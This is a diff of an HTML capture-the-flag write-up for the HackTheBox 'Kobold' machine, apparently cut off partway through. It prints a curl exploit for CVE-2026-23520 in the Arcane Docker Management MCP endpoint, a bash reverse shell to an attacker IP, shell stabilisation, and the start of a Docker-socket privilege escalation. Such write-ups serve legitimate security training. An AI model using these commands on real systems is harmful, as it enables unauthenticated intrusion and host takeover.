@@ -1,556 +1,567 @@
-<!DOCTYPE html>
-<html lang="en" data-theme="dark">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>CTF Writeup — Kobold</title>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;1,400&family=DM+Sans:wght@400;500;700&family=Syne:wght@700;800&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="../assets/style.css" />
-  <meta name="google-site-verification" content="3Vc8x1jdXPIbvS5X4iuKAZkwUSr18FC1WMOho-akXHg" />
-  <meta name="description" content="Kobold HTB writeup — exploiting an unauthenticated API and abusing a Docker socket to achieve container escape. HackTheBox 2026, MISC, Easy.">
-  <link rel="canonical" href="https://tomatobuster.github.io/WriteUps/writeups/kobold.html">
-  <link rel="alternate" type="application/rss+xml" title="TomatoBuster CTF Writeups" href="https://tomatobuster.github.io/WriteUps/feed.xml">
-  <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "TechArticle",
-      "headline": "Kobold — HTB Writeup",
-      "description": "Exploiting an unauthenticated API and abusing a Docker socket to achieve container escape. HackTheBox 2026, MISC, Easy.",
-      "author": {
-        "@type": "Person",
-        "name": "TomatoBuster",
-        "url": "https://tomatobuster.github.io/WriteUps/"
-      },
-      "publisher": {
-        "@type": "Person",
-        "name": "TomatoBuster",
-        "url": "https://tomatobuster.github.io/WriteUps/"
-      },
-      "datePublished": "2026-03-24",
-      "dateModified": "2026-03-24",
-      "url": "https://tomatobuster.github.io/WriteUps/writeups/kobold.html",
-      "mainEntityOfPage": "https://tomatobuster.github.io/WriteUps/writeups/kobold.html",
-      "keywords": ["CTF", "HackTheBox", "MISC", "Docker", "API exploitation", "container escape"],
-      "articleSection": "CTF Writeups",
-      "difficulty": "Easy"
-    }
-</script>
-  <!-- Open Graph -->
-  <meta property="og:title" content="Kobold — HTB Writeup | TomatoBuster">
-  <meta property="og:description" content="Exploiting an unauthenticated API and abusing a Docker socket to achieve container escape. HackTheBox 2026, MISC, Easy.">
-  <meta property="og:type" content="article">
-  <meta property="og:url" content="https://tomatobuster.github.io/WriteUps/writeups/kobold.html">
-  <meta property="og:image" content="https://tomatobuster.github.io/WriteUps/assets/img/og-kobold.png">
-  <meta property="article:published_time" content="2026-03-24">
-  <meta property="article:author" content="TomatoBuster">
-  <meta property="article:tag" content="CTF, HackTheBox, MISC, Docker, API">
+  <!DOCTYPE html>
+  <html lang="en" data-theme="dark">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CTF Writeup — Kobold</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;1,400&family=DM+Sans:wght@400;500;700&family=Syne:wght@700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="../assets/style.css" />
+    <meta name="google-site-verification" content="3Vc8x1jdXPIbvS5X4iuKAZkwUSr18FC1WMOho-akXHg" />
+    <meta name="description" content="Kobold HTB writeup — exploiting an unauthenticated API and abusing a Docker socket to achieve container escape. HackTheBox 2026, MISC, Easy.">
+    <link rel="canonical" href="https://tomatobuster.github.io/WriteUps/writeups/kobold.html">
+    <link rel="alternate" type="application/rss+xml" title="TomatoBuster CTF Writeups" href="https://tomatobuster.github.io/WriteUps/feed.xml">
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "TechArticle",
+        "headline": "Kobold — HTB Writeup",
+        "description": "Exploiting an unauthenticated API and abusing a Docker socket to achieve container escape. HackTheBox 2026, MISC, Easy.",
+        "author": {
+          "@type": "Person",
+          "name": "TomatoBuster",
+          "url": "https://tomatobuster.github.io/WriteUps/"
+        },
+        "publisher": {
+          "@type": "Person",
+          "name": "TomatoBuster",
+          "url": "https://tomatobuster.github.io/WriteUps/"
+        },
+        "datePublished": "2026-03-24",
+        "dateModified": "2026-03-24",
+        "url": "https://tomatobuster.github.io/WriteUps/writeups/kobold.html",
+        "mainEntityOfPage": "https://tomatobuster.github.io/WriteUps/writeups/kobold.html",
+        "keywords": ["CTF", "HackTheBox", "MISC", "Docker", "API exploitation", "container escape"],
+        "articleSection": "CTF Writeups",
+        "difficulty": "Easy"
+      }
+  </script>
+    <!-- Open Graph -->
+    <meta property="og:title" content="Kobold — HTB Writeup | TomatoBuster">
+    <meta property="og:description" content="Exploiting an unauthenticated API and abusing a Docker socket to achieve container escape. HackTheBox 2026, MISC, Easy.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://tomatobuster.github.io/WriteUps/writeups/kobold.html">
+    <meta property="og:image" content="https://tomatobuster.github.io/WriteUps/assets/img/og-kobold.png">
+    <meta property="article:published_time" content="2026-03-24">
+    <meta property="article:author" content="TomatoBuster">
+    <meta property="article:tag" content="CTF, HackTheBox, MISC, Docker, API">
 
-  <!-- Twitter Card -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Kobold — HTB Writeup | TomatoBuster">
-  <meta name="twitter:description" content="Exploiting an unauthenticated API and abusing a Docker socket to achieve container escape. HackTheBox 2026, MISC, Easy.">
-  <meta name="twitter:image" content="https://tomatobuster.github.io/WriteUps/assets/img/og-kobold.png">
-  <link rel="icon" type="image/x-icon" href="../ico/favicon.ico">
-  <link rel="icon" type="image/png" sizes="32x32" href="../ico/favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="../ico/favicon-16x16.png">
-  <link rel="apple-touch-icon" sizes="180x180" href="../ico/apple-touch-icon.png">
-  <link rel="manifest" href="../ico/site.webmanifest">
-  
-</head>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-1F5LGPYZNR"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Kobold — HTB Writeup | TomatoBuster">
+    <meta name="twitter:description" content="Exploiting an unauthenticated API and abusing a Docker socket to achieve container escape. HackTheBox 2026, MISC, Easy.">
+    <meta name="twitter:image" content="https://tomatobuster.github.io/WriteUps/assets/img/og-kobold.png">
+    <link rel="icon" type="image/x-icon" href="../ico/favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="../ico/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../ico/favicon-16x16.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="../ico/apple-touch-icon.png">
+    <link rel="manifest" href="../ico/site.webmanifest">
+    
+  </head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-1F5LGPYZNR"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
 
-  gtag('config', 'G-1F5LGPYZNR');
-</script>
+    gtag('config', 'G-1F5LGPYZNR');
+  </script>
 
-<body>
+  <body>
 
-<div class="page-wrap">
+  <div class="page-wrap">
 
-  <!-- NAV -->ß
-<nav class="topnav">
-  <a class="topnav-logo" href="index.html">TomatoBuster</a>
-  <div class="topnav-right">
-    <ul class="topnav-links" id="nav-links">
-      <li><a href="../index.html">Home</a></li>
-      <li><a href="../writeups.html">Writeups</a></li>
-      <li><a href="../categories.html">Categories</a></li>
-    </ul>
-    <button class="hamburger" id="hamburger" aria-label="Toggle navigation">
-      <span></span>
-      <span></span>
-      <span></span>
-    </button>
-    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">
-      <span class="toggle-moon">🌙</span>
-      <span class="toggle-sun">☀️</span>
-    </button>
-  </div>
-</nav>
-
-  <!-- HERO -->
-  <header class="hero">
-    <div class="hero-eyebrow">
-      <span class="badge badge-misc">MISC</span>
-      <span class="badge badge-easy">EASY</span>
-      <div class="hero-sep"></div>
-      <span class="hero-meta-text">TomatoBuster 2026 &nbsp;·&nbsp; Mar 24, 2026</span>
+    <!-- NAV -->ß
+  <nav class="topnav">
+    <a class="topnav-logo" href="index.html">TomatoBuster</a>
+    <div class="topnav-right">
+      <ul class="topnav-links" id="nav-links">
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../writeups.html">Writeups</a></li>
+        <li><a href="../categories.html">Categories</a></li>
+      </ul>
+      <button class="hamburger" id="hamburger" aria-label="Toggle navigation">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">
+        <span class="toggle-moon">🌙</span>
+        <span class="toggle-sun">☀️</span>
+      </button>
     </div>
-    <h1>Kob<span class="accent">old</span></h1>
-    <p class="hero-desc">
-      API endpoint exploitation via CVE-2026-23520 to gain a reverse shell as <code>ben</code>, then abusing the Docker socket to mount the host filesystem and obtain the root flag.
-    </p>
-  </header>
+  </nav>
 
-  <!-- INFO STRIP -->
-  <div class="info-strip">
-    <div class="info-cell">
-      <div class="info-label">Category</div>
-      <div class="info-value cyan">Miscellaneous</div>
-    </div>
-    <div class="info-cell">
-      <div class="info-label">Architecture</div>
-      <div class="info-value">Linux</div>
-    </div>
-    <div class="info-cell">
-      <div class="info-label">Protections</div>
-      <div class="info-value green">None</div>
-    </div>
-    <div class="info-cell">
-      <div class="info-label">Solver</div>
-      <div class="info-value">@Tomat0Buster</div>
-    </div>
-  </div>
-
-  <!-- TOC -->
-  <div class="toc">
-    <div class="toc-title">// Table of Contents</div>
-    <ul>
-      <li><a href="#recon">01 — Reconnaissance &amp; Website Analysis</a></li>
-      <li><a href="#vuln">02 — Vulnerability Analysis</a></li>
-      <li><a href="#exploit">03 — Exploit — Reverse Shell via CVE-2026-23520</a></li>
-      <li><a href="#user-flag">04 — User Flag</a></li>
-      <li><a href="#privesc">05 — Privilege Escalation via Docker Socket</a></li>
-      <li><a href="#flag">06 — Root Flag</a></li>
-    </ul>
-  </div>
-
-  <!-- SECTION 1 -->
-  <section class="section" id="recon">
-    <div class="section-header">
-      <span class="section-num">01</span>
-      <h2>Reconnaissance &amp; Website Analysis</h2>
-      <div class="section-line"></div>
-    </div>
-
-    <p>We start by enumerating with nmap and gobuster as usual. Nmap reveals a web server on port 80/443, and gobuster vhost enumeration turns up <b>2 interesting subdomains</b>.</p>
-
-    <div class="terminal">
-      <div class="terminal-bar">
-        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-        <span class="tb-title">bash — 80×24</span>
+    <!-- HERO -->
+    <header class="hero">
+      <div class="hero-eyebrow">
+        <span class="badge badge-misc">MISC</span>
+        <span class="badge badge-easy">EASY</span>
+        <div class="hero-sep"></div>
+        <span class="hero-meta-text">TomatoBuster 2026 &nbsp;·&nbsp; Mar 24, 2026</span>
       </div>
-      <pre><span class="prompt">$ </span><span class="cmd">nmap 10.129.15.195</span>
-<span class="out">Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 14:26 CET
-Nmap scan report for kobold.htb (10.129.16.53)
-Host is up (0.075s latency).
-Not shown: 997 closed tcp ports (conn-refused)
-PORT    STATE SERVICE
-22/tcp  open  ssh
-80/tcp  open  http
-443/tcp open  https
+      <h1>Kob<span class="accent">old</span></h1>
+      <p class="hero-desc">
+        API endpoint exploitation via CVE-2026-23520 to gain a reverse shell as <code>ben</code>, then abusing the Docker socket to mount the host filesystem and obtain the root flag.
+      </p>
+    </header>
 
-Nmap done: 1 IP address (1 host up) scanned in 13.69 seconds</span>
-
-<span class="prompt">$ </span><span class="cmd">gobuster vhost -u "https://kobold.htb" -w "bitquark-subdomains-top100000.txt" --append-domain --no-tls-validation</span>
-<span class="out">===============================================================
-Gobuster v3.8.2
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                       https://kobold.htb
-[+] Method:                    GET
-[+] Threads:                   10
-[+] Wordlist:                  ./bitquark-subdomains-top100000.txt
-[+] User Agent:                gobuster/3.8.2
-[+] Timeout:                   10s
-[+] Append Domain:             true
-===============================================================
-Starting gobuster in VHOST enumeration mode
-===============================================================
-mcp.kobold.htb Status: 200 [Size: 466]
-bin.kobold.htb Status: 200 [Size: 24402]
-Progress: 10853 / 100000 (10.85%)
-  </span>
-    </div>
-
-    <p>Visiting the two subdomains reveals their purposes:</p>
-    <ul>
-      <li><code>bin.kobold.htb</code> — hosting a <b>PrivateBin</b> instance (an open-source pastebin).</li>
-      <li><code>mcp.kobold.htb</code> — hosting an <b>Arcane Docker Management</b> panel, which exposes a Model Context Protocol (MCP) API interface.</li>
-    </ul>
-
-    <div class="callout info">
-      <span class="callout-icon">ℹ</span>
-      <div>
-        <strong>Key Findings</strong>
-        Two distinct services: a PrivateBin instance at <code>bin.kobold.htb</code> and an Arcane Docker Management MCP server at <code>mcp.kobold.htb</code>. The MCP panel's version info is visible in the page source — it's running <b>Arcane Docker Management v1.13.0</b>.
+    <!-- INFO STRIP -->
+    <div class="info-strip">
+      <div class="info-cell">
+        <div class="info-label">Category</div>
+        <div class="info-value cyan">Miscellaneous</div>
+      </div>
+      <div class="info-cell">
+        <div class="info-label">Architecture</div>
+        <div class="info-value">Linux</div>
+      </div>
+      <div class="info-cell">
+        <div class="info-label">Protections</div>
+        <div class="info-value green">None</div>
+      </div>
+      <div class="info-cell">
+        <div class="info-label">Solver</div>
+        <div class="info-value">@Tomat0Buster</div>
       </div>
     </div>
-  </section>
 
-  <!-- SECTION 2 -->
-  <section class="section" id="vuln">
-    <div class="section-header">
-      <span class="section-num">02</span>
-      <h2>Vulnerability Analysis</h2>
-      <div class="section-line"></div>
+    <!-- TOC -->
+    <div class="toc">
+      <div class="toc-title">// Table of Contents</div>
+      <ul>
+        <li><a href="#recon">01 — Reconnaissance &amp; Website Analysis</a></li>
+        <li><a href="#vuln">02 — Vulnerability Analysis</a></li>
+        <li><a href="#exploit">03 — Exploit — Reverse Shell via CVE-2026-23520</a></li>
+        <li><a href="#user-flag">04 — User Flag</a></li>
+        <li><a href="#privesc">05 — Privilege Escalation via Docker Socket</a></li>
+        <li><a href="#flag">06 — Root Flag</a></li>
+      </ul>
     </div>
 
-    <p>A quick Google search for CVEs related to <b>PrivateBin</b> and <b>Arcane Docker Management</b> leads us to <b>CVE-2026-23520</b>. This vulnerability affects Arcane Docker Management <b>v1.13.0</b> and below.</p>
-
-    <p>The flaw lies in the <code>/api/mcp/connect</code> endpoint: it accepts a JSON payload with a <code>serverConfig</code> object that specifies a <code>command</code> and <code>args</code> to execute. Because no authentication or input validation is enforced, an unauthenticated attacker can pass arbitrary shell commands and achieve <b>Remote Code Execution</b>.</p>
-
-    <table class="vuln-table">
-      <thead>
-        <tr>
-          <th>CVE</th>
-          <th>Service</th>
-          <th>Version</th>
-          <th>Impact</th>
-          <th>Severity</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td><code>CVE-2026-23520</code></td>
-          <td>Arcane Docker Management</td>
-          <td>≤ v1.13.0</td>
-          <td>Unauthenticated RCE via <code>/api/mcp/connect</code></td>
-          <td class="severity-high">CRITICAL</td>
-        </tr>
-      </tbody>
-    </table>
-
-    <div class="callout warning">
-      <span class="callout-icon">⚠</span>
-      <div>
-        <strong>Attack Surface</strong>
-        The <code>/api/mcp/connect</code> endpoint takes a <code>serverConfig.command</code> value and executes it server-side with no sanitisation. Passing <code>bash</code> with a reverse-shell one-liner in <code>args</code> is all we need.
+    <!-- SECTION 1 -->
+    <section class="section" id="recon">
+      <div class="section-header">
+        <span class="section-num">01</span>
+        <h2>Reconnaissance &amp; Website Analysis</h2>
+        <div class="section-line"></div>
       </div>
-    </div>
-  </section>
 
-  <!-- SECTION 3 -->
-  <section class="section" id="exploit">
-    <div class="section-header">
-      <span class="section-num">03</span>
-      <h2>Exploit — Reverse Shell via CVE-2026-23520</h2>
-      <div class="section-line"></div>
-    </div>
+      <p>We start by enumerating with nmap and gobuster as usual. Nmap reveals a web server on port 80/443, and gobuster vhost enumeration turns up <b>2 interesting subdomains</b>.</p>
 
-    <p>We set up a listener on our attacker machine, then trigger the vulnerable endpoint with a crafted curl command.</p>
-
-    <div class="steps">
-
-      <div class="step">
-        <div class="step-track">
-          <div class="step-dot">1</div>
-          <div class="step-line"></div>
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+          <span class="tb-title">bash — 80×24</span>
         </div>
-        <div class="step-body">
-          <div class="step-title">// Start a reverse shell listener</div>
-          <p>Open a terminal and start ncat listening on port 4444.</p>
-          <div class="terminal">
-            <div class="terminal-bar">
-              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-              <span class="tb-title">terminal 1 — listener</span>
-            </div>
-            <pre><span class="prompt">$ </span><span class="cmd">ncat -lvp 4444</span>
-<span class="out">Ncat: Version 7.95 ( https://nmap.org/ncat )
-Ncat: Listening on :::4444
-Ncat: Listening on 0.0.0.0:4444</span></pre>
+        <pre><span class="prompt">$ </span><span class="cmd">nmap 10.129.15.195</span>
+  <span class="out">Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 14:26 CET
+  Nmap scan report for kobold.htb (10.129.16.53)
+  Host is up (0.075s latency).
+  Not shown: 997 closed tcp ports (conn-refused)
+  PORT    STATE SERVICE
+  22/tcp  open  ssh
+  80/tcp  open  http
+  443/tcp open  https
+
+  Nmap done: 1 IP address (1 host up) scanned in 13.69 seconds</span>
+
+  <span class="prompt">$ </span><span class="cmd">gobuster vhost -u "https://kobold.htb" -w "bitquark-subdomains-top100000.txt" --append-domain --no-tls-validation</span>
+  <span class="out">===============================================================
+  Gobuster v3.8.2
+  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+  ===============================================================
+  [+] Url:                       https://kobold.htb
+  [+] Method:                    GET
+  [+] Threads:                   10
+  [+] Wordlist:                  ./bitquark-subdomains-top100000.txt
+  [+] User Agent:                gobuster/3.8.2
+  [+] Timeout:                   10s
+  [+] Append Domain:             true
+  ===============================================================
+  Starting gobuster in VHOST enumeration mode
+  ===============================================================
+  mcp.kobold.htb Status: 200 [Size: 466]
+  bin.kobold.htb Status: 200 [Size: 24402]
+  Progress: 10853 / 100000 (10.85%)
+    </span>
+      </div>
+
+      <p>Visiting the two subdomains reveals their purposes:</p>
+      <ul>
+        <li><code>bin.kobold.htb</code> — hosting a <b>PrivateBin</b> instance (an open-source pastebin).</li>
+        <li><code>mcp.kobold.htb</code> — hosting an <b>Arcane Docker Management</b> panel, which exposes a Model Context Protocol (MCP) API interface.</li>
+      </ul>
+
+      <div class="callout info">
+        <span class="callout-icon">ℹ</span>
+        <div>
+          <strong>Key Findings</strong>
+          Two distinct services: a PrivateBin instance at <code>bin.kobold.htb</code> and an Arcane Docker Management MCP server at <code>mcp.kobold.htb</code>. The MCP panel's version info is visible in the page source — it's running <b>Arcane Docker Management v1.13.0</b>.
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 2 -->
+    <section class="section" id="vuln">
+      <div class="section-header">
+        <span class="section-num">02</span>
+        <h2>Vulnerability Analysis</h2>
+        <div class="section-line"></div>
+      </div>
+
+      <p>A quick Google search for CVEs related to <b>PrivateBin</b> and <b>Arcane Docker Management</b> leads us to <b>CVE-2026-23520</b>. This vulnerability affects Arcane Docker Management <b>v1.13.0</b> and below.</p>
+
+      <p>The flaw lies in the <code>/api/mcp/connect</code> endpoint: it accepts a JSON payload with a <code>serverConfig</code> object that specifies a <code>command</code> and <code>args</code> to execute. Because no authentication or input validation is enforced, an unauthenticated attacker can pass arbitrary shell commands and achieve <b>Remote Code Execution</b>.</p>
+
+      <table class="vuln-table">
+        <thead>
+          <tr>
+            <th>CVE</th>
+            <th>Service</th>
+            <th>Version</th>
+            <th>Impact</th>
+            <th>Severity</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><code>CVE-2026-23520</code></td>
+            <td>Arcane Docker Management</td>
+            <td>≤ v1.13.0</td>
+            <td>Unauthenticated RCE via <code>/api/mcp/connect</code></td>
+            <td class="severity-high">CRITICAL</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="callout warning">
+        <span class="callout-icon">⚠</span>
+        <div>
+          <strong>Attack Surface</strong>
+          The <code>/api/mcp/connect</code> endpoint takes a <code>serverConfig.command</code> value and executes it server-side with no sanitisation. Passing <code>bash</code> with a reverse-shell one-liner in <code>args</code> is all we need.
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 3 -->
+    <section class="section" id="exploit">
+      <div class="section-header">
+        <span class="section-num">03</span>
+        <h2>Exploit — Reverse Shell via CVE-2026-23520</h2>
+        <div class="section-line"></div>
+      </div>
+
+      <p>We set up a listener on our attacker machine, then trigger the vulnerable endpoint with a crafted curl command.</p>
+
+      <div class="steps">
+
+        <div class="step">
+          <div class="step-track">
+            <div class="step-dot">1</div>
+            <div class="step-line"></div>
           </div>
-        </div>
-      </div>
-
-      <div class="step">
-        <div class="step-track">
-          <div class="step-dot">2</div>
-          <div class="step-line"></div>
-        </div>
-        <div class="step-body">
-          <div class="step-title">// Trigger the vulnerable endpoint</div>
-          <p>In a second terminal, fire the exploit with curl. The <code>serverConfig</code> tells the server to run <code>bash -c</code> with a standard TCP reverse shell one-liner pointing back at our IP.</p>
-          <div class="terminal">
-            <div class="terminal-bar">
-              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-              <span class="tb-title">terminal 2 — exploit</span>
-            </div>
-            <pre><span class="prompt">$ </span><span class="cmd">curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
-  -H "Content-Type: application/json" \
-  -d '{"serverId": "shell1", "serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/10.10.14.194/4444 0>&1"], "env": {}}}'</span></pre>
-          </div>
-        </div>
-      </div>
-
-      <div class="step">
-        <div class="step-track">
-          <div class="step-dot">3</div>
-          <div class="step-line"></div>
-        </div>
-        <div class="step-body">
-          <div class="step-title">// Shell received</div>
-          <p>Switching back to terminal 1, we catch the incoming connection and confirm we are running as user <b>ben</b>.</p>
-          <div class="terminal">
-            <div class="terminal-bar">
-              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-              <span class="tb-title">terminal 1 — shell</span>
-            </div>
-            <pre><span class="out">Ncat: Connection from 10.129.16.53.
-Ncat: Connection from 10.129.16.53:54312.</span>
-<span class="prompt">ben@kobold:~$ </span><span class="cmd">id</span>
-<span class="out">uid=1001(ben) gid=1001(ben) groups=1001(ben)</span></pre>
-          </div>
-        </div>
-      </div>
-
-      <div class="step">
-        <div class="step-track">
-          <div class="step-dot">4</div>
-        </div>
-        <div class="step-body">
-          <div class="step-title">// Stabilize the shell</div>
-          <p>The raw reverse shell is dumb — no tab completion, no arrow keys, and <kbd>Ctrl+C</kbd> kills the whole session. We upgrade it to a fully interactive TTY in three quick moves.</p>
-          <div class="terminal">
-            <div class="terminal-bar">
-              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-              <span class="tb-title">terminal 1 — stabilize</span>
-            </div>
-            <pre><span class="cm"># 1. Spawn a proper PTY inside the reverse shell</span>
-<span class="prompt">ben@kobold:~$ </span><span class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
-<span class="out">ben@kobold:~$</span>
-
-<span class="cm"># 2. Background the shell, then fix the local terminal settings</span>
-<span class="prompt">ben@kobold:~$ </span><span class="cmd">^Z</span>
-<span class="out">[1]+  Stopped                 ncat -lvp 4444</span>
-<span class="prompt">$ </span><span class="cmd">stty raw -echo; fg</span>
-<span class="out">ncat -lvp 4444</span>
-
-<span class="cm"># 3. Set the terminal type so colours and clear work correctly</span>
-<span class="prompt">ben@kobold:~$ </span><span class="cmd">export TERM=xterm</span>
-<span class="prompt">ben@kobold:~$ </span></pre>
-          </div>
-          <div class="callout info" style="margin-top:1rem">
-            <span class="callout-icon">ℹ</span>
-            <div>
-              <strong>Why each step matters</strong>
-              <code>pty.spawn</code> allocates a pseudo-terminal so the shell behaves like a real one. <code>stty raw -echo</code> stops our local terminal from intercepting keystrokes before they reach the remote shell. <code>fg</code> brings ncat back to the foreground with those settings active. Finally, <code>export TERM=xterm</code> lets programs like <code>nano</code> and <code>clear</code> render correctly.
+          <div class="step-body">
+            <div class="step-title">// Start a reverse shell listener</div>
+            <p>Open a terminal and start ncat listening on port 4444.</p>
+            <div class="terminal">
+              <div class="terminal-bar">
+                <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+                <span class="tb-title">terminal 1 — listener</span>
+              </div>
+              <pre><span class="prompt">$ </span><span class="cmd">ncat -lvp 4444</span>
+  <span class="out">Ncat: Version 7.95 ( https://nmap.org/ncat )
+  Ncat: Listening on :::4444
+  Ncat: Listening on 0.0.0.0:4444</span></pre>
             </div>
           </div>
         </div>
-      </div>
 
-    </div>
-  </section>
-
-  <!-- SECTION 4 — USER FLAG -->
-  <section class="section" id="user-flag">
-    <div class="section-header">
-      <span class="section-num">04</span>
-      <h2>User Flag</h2>
-      <div class="section-line"></div>
-    </div>
-
-    <p>With a shell as <code>ben</code>, the user flag is sitting right in the home directory.</p>
-
-    <div class="terminal">
-      <div class="terminal-bar">
-        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-        <span class="tb-title">ben@kobold</span>
-      </div>
-      <pre><span class="prompt">ben@kobold:~$ </span><span class="cmd">cat user.txt</span>
-<span class="flag-out">HTB{REDACTED}</span></pre>
-    </div>
-
-    <div class="callout flag">
-      <span class="callout-icon">⚑</span>
-      <div>
-        <strong>User Flag Captured</strong>
-        CVE-2026-23520 gives us an unauthenticated shell straight into the box. First flag done — now let's escalate.
-      </div>
-    </div>
-  </section>
-
-  <!-- SECTION 5 — PRIVESC -->
-  <section class="section" id="privesc">
-    <div class="section-header">
-      <span class="section-num">05</span>
-      <h2>Privilege Escalation via Docker Socket</h2>
-      <div class="section-line"></div>
-    </div>
-
-    <p>While enumerating the system we notice that Docker is running. However, <code>ben</code> is not in the <code>docker</code> group, so running docker commands fails.</p>
-
-    <div class="terminal">
-      <div class="terminal-bar">
-        <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-        <span class="tb-title">ben@kobold</span>
-      </div>
-      <pre><span class="prompt">ben@kobold:~$ </span><span class="cmd">docker ps</span>
-<span class="out">permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/containers/json": dial unix /var/run/docker.sock: connect: permission denied</span></pre>
-    </div>
-
-    <div class="steps">
-
-      <div class="step">
-        <div class="step-track">
-          <div class="step-dot">1</div>
-          <div class="step-line"></div>
-        </div>
-        <div class="step-body">
-          <div class="step-title">// Add ourselves to the docker group</div>
-          <p>Despite the restriction, we can simply switch our active group to <code>docker</code> using <code>newgrp</code>, which gives us access to the Docker socket for the current session.</p>
-          <div class="terminal">
-            <div class="terminal-bar">
-              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-              <span class="tb-title">ben@kobold</span>
+        <div class="step">
+          <div class="step-track">
+            <div class="step-dot">2</div>
+            <div class="step-line"></div>
+          </div>
+          <div class="step-body">
+            <div class="step-title">// Trigger the vulnerable endpoint</div>
+            <p>In a second terminal, fire the exploit with curl. The <code>serverConfig</code> tells the server to run <code>bash -c</code> with a standard TCP reverse shell one-liner pointing back at our IP.</p>
+            <div class="terminal">
+              <div class="terminal-bar">
+                <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+                <span class="tb-title">terminal 2 — exploit</span>
+              </div>
+              <pre><span class="prompt">$ </span><span class="cmd">curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+    -H "Content-Type: application/json" \
+    -d '{"serverId": "shell1", "serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/10.10.14.194/4444 0>&1"], "env": {}}}'</span></pre>
             </div>
-            <pre><span class="prompt">ben@kobold:~$ </span><span class="cmd">newgrp docker</span>
-<span class="prompt">ben@kobold:~$ </span><span class="cmd">docker ps</span>
-<span class="out">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
-4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   5 weeks ago   Up 2 hours   127.0.0.1:8080->8080/tcp   bin
-</span></pre>
           </div>
         </div>
-      </div>
 
-      <div class="step">
-        <div class="step-track">
-          <div class="step-dot">2</div>
-          <div class="step-line"></div>
-        </div>
-        <div class="step-body">
-          <div class="step-title">// Mount the host filesystem into a container</div>
-          <p>The PrivateBin image <code>privatebin/nginx-fpm-alpine:2.0.2</code> is already downloaded on the machine. We spin up a container as root (<code>-u 0</code>) and mount the entire host filesystem to <code>/mnt</code>.</p>
-          <div class="terminal">
-            <div class="terminal-bar">
-              <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
-              <span class="tb-title">ben@kobold</span>
+        <div class="step">
+          <div class="step-track">
+            <div class="step-dot">3</div>
+            <div class="step-line"></div>
+          </div>
+          <div class="step-body">
+            <div class="step-title">// Shell received</div>
+            <p>Switching back to terminal 1, we catch the incoming connection and confirm we are running as user <b>ben</b>.</p>
+            <div class="terminal">
+              <div class="terminal-bar">
+                <div class="tb-dot"></div><div class="tb-dot"></div><div class="tb-dot"></div>
+                <span class="tb-title">terminal 1 — shell</span>
+              </div>
+              <pre><span class="out">Ncat: Connection from 10.129.16.53.
+  Ncat: Connection from 10.129.16.53:54312.</span>
+  <span class="prompt">ben@kobold:~$ </span><span class="cmd">id</span>
+  <span class="out">uid=1001(ben) gid=1001(ben) groups=1001(ben)</span></pre>
             </div>
